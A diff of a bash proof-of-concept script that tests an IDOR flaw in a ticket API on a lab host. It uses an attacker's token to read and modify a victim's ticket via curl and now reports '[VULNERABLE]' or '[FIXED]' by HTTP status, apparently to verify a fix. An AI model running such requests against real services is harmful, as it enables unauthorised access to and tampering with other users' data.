@@ -1,6 +1,9 @@
 #!/bin/bash
 
-TARGET_IP="http://192.168.200.1:8082"
+# Source config from parent directory
+source $(dirname "$0")/../config.sh
+
+# TARGET_IP loaded from config.sh
 SUFFIX=$RANDOM
 
 VICTIM_EMAIL="IDOR.victim_${SUFFIX}@example.com"
@@ -61,6 +64,11 @@ TICKET_ID=$(echo "$TICKET_JSON" | python3 -c "import sys,json; print(json.load(s
 
 echo "Extracted victim's ticket ID: $TICKET_ID"
 
+if [ -z "$TICKET_ID" ] || [ "$TICKET_ID" == "null" ] || [ "$TICKET_ID" == "None" ]; then
+    echo -e "Failed to create ticket. Exiting."
+    exit 1
+fi
+
 # =======================================================================================
 
 echo -e "\n2. Attacker READS the victim's ticket (IDOR on GET /{id})"
@@ -70,13 +78,23 @@ curl -s -X GET "$TARGET_IP/tickets/$TICKET_ID" \
 # =======================================================================================
 
 echo -e "\n3. Attacker UPDATES the victim's ticket (IDOR on PATCH /{id})"
-curl -s -X PATCH "$TARGET_IP/tickets/$TICKET_ID" \
+RESPONSE=$(curl -s -w "\n%{http_code}" -X PATCH "$TARGET_IP/tickets/$TICKET_ID" \
   -H "Authorization: Bearer $ATTACKER_TOKEN" \
   -H "Content-Type: application/json" \
   -d '{
   "title": "Changed by attacker",
+  "description": "Victim and attacker eyes only",
   "severity": "LOW"
-}' | jq .
+}')
+BODY=$(echo "$RESPONSE" | head -n -1)
+CODE=$(echo "$RESPONSE" | tail -n 1)
+echo "$BODY" | jq .
+
+if [ "$CODE" == "200" ]; then
+    echo "[VULNERABLE] Attacker successfully updated the ticket (HTTP 200)"
+else
+    echo "[FIXED] Attacker failed to update the ticket (HTTP $CODE)"
+fi
 
 # =======================================================================================
 
